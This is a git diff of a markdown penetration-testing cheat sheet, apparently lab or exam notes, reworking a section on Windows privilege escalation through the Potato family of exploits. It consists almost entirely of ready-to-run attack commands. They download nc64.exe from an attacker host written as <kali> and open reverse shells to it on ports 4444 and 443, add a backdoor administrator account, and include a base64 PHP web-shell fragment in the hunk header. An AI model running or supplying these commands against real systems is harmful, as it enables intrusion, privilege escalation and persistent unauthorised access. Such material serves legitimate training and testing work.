@@ -906,12 +906,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - Execute the .\CVE-xxx-xxxx.exe and priviledge escalate
 - :octocat: **Privilege Escalation with "SeImpersonatePrivilege" or "SeAssignPrimaryTokenPrivilege" right**
   `whoami /priv` 
-  - 🖥️ **SigmaPotato.exe**  
-    ```
-    .\SigmaPotato "net user dave4 lab /add
-    .\SigmaPotato "net localgroup Administrators dave4 /add"
-    ```
-  - 🖥️ **PrintSpoofer.exe**
+  - 🖥️ **PrintSpoofer.exe**  
     `.\PrintSpoofer64.exe -i -c powershell.exe`  
   - 🖥️ **GodPotato.exe**
     ```
@@ -921,13 +916,17 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     iwr -uri http://<kali>/nc64.exe -OutFile 'nc64.exe'
     .\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe <kali> 4444"
     ```
+ - 🖥️ **SigmaPotato.exe**  
+    ```
+    .\SigmaPotato "net user dave4 lab /add
+    .\SigmaPotato "net localgroup Administrators dave4 /add"
+    ```
   
 | Exploit       | Works On                           | Privilege Required              | Command Example                                                                 |
 |---------------|------------------------------------|---------------------------------|---------------------------------------------------------------------------------|
-| **JuicyPotato** (2018) | Win7/8/10 < 1903, Server ≤ 2016 | `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` | `.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -c {clsid}` |
-| **PrintSpoofer** (2020) | Win10 1903+, Server 2019 | `SeImpersonatePrivilege`        | `.\PrintSpoofer.exe -i -c C:\Windows\System32\cmd.exe`                                                |
-| **GodPotato** (2021)    | Win10, Server 2019+      | `SeImpersonatePrivilege`        | `.\GodPotato-NET4.exe -cmd "cmd.exe"`                                                  |
-| **SigmaPotato** (2022+) | Win10/11, Server 2016–2022 | `SeImpersonatePrivilege`        | `.\SigmaPotato.exe -i -c "C:\Windows\System32\cmd.exe"`                                               |
+| **PrintSpoofer** (2020) | Win10 1903+, Server 2019 | `SeImpersonatePrivilege`        | `.\printspoofer.exe -i -c powershell.exe`                                                |
+| **GodPotato** (2021)    | Win10, Server 2019+      | `SeImpersonatePrivilege`        | `.\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe <kali> 443`                                                  |
+| **SigmaPotato** (2022+) | Win10/11, Server 2016–2022 | `SeImpersonatePrivilege`        | `.\SigmaPotato.exe --revshell <kali ip> 443`                                               |
 
 # Linux priviledge  
 - 🖥️ **Automated Linux Enum - LinPEAS.sh**
